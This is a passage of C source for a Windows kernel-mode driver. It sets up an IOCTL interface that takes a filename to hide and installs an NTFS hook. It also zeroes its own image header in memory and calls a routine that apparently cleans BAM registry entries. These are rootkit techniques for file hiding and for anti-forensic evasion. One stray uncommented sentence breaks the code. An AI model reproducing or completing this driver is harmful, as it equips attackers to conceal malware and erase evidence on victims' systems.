        // Buffer contains the WCHAR string of file to hide
        PKERNEL_READ_REQUEST req = (PKERNEL_READ_REQUEST)Irp->AssociatedIrp.SystemBuffer; // Reusing struct for size/buffer convenience
        if (req && req->Size > 0 && req->Size < 256) {
             WCHAR* inBuf = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;
             ULONG inLen = stack->Parameters.DeviceIoControl.InputBufferLength;
             
             if (inLen > 0 && inLen < 512) {
                 RtlZeroMemory(g_HiddenFileName, sizeof(g_HiddenFileName));
                 RtlCopyMemory(g_HiddenFileName, inBuf, inLen);
                 g_HiddenNameLen = inLen;
                 // Ensure null termination safely? 
                 // WCHAR len is bytes.
             }
        }
        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) {
    // Uninstall NTFS Hook first!
    UninstallNtfsHook();

    UNICODE_STRING symLink = RTL_CONSTANT_STRING(SYMBOLIC_LINK);
    IoDeleteSymbolicLink(&symLink);
    IoDeleteDevice(DriverObject->DeviceObject);
    return STATUS_SUCCESS;
}
For now, we skip global modification to avoid BSODs on 22H2+.

NTSTATUS CleanDriverHeader(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject || !DriverObject->DriverStart) return STATUS_SUCCESS;
    
    PVOID BaseAddress = DriverObject->DriverStart;
    ULONG Size = 0x1000; // 4KB

    // Check if memory is valid/writable? 
    PMDL mdl = IoAllocateMdl(BaseAddress, Size, FALSE, FALSE, NULL);
    if (!mdl) return STATUS_UNSUCCESSFUL;

    MmBuildMdlForNonPagedPool(mdl);
    PVOID Mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmCached, NULL, FALSE, NormalPagePriority);
    
    if (Mapped) {
        RtlZeroMemory(Mapped, Size);
        MmUnmapLockedPages(Mapped, mdl);
    }
    
    IoFreeMdl(mdl);
    return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    NTSTATUS status;
    PDEVICE_OBJECT deviceObject;
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(DRIVER_NAME);
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(SYMBOLIC_LINK);


    status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) return status;

    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(deviceObject);
        return status;
    }

    // 3. Setup IOCTLs
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
    DriverObject->DriverUnload = UnloadDriver;

    deviceObject->Flags |= DO_BUFFERED_IO;
    deviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    InstallNtfsHook();

    CleanDriverHeader(DriverObject);

    CleanBAMRegistry();

    return STATUS_SUCCESS;
}

#endif
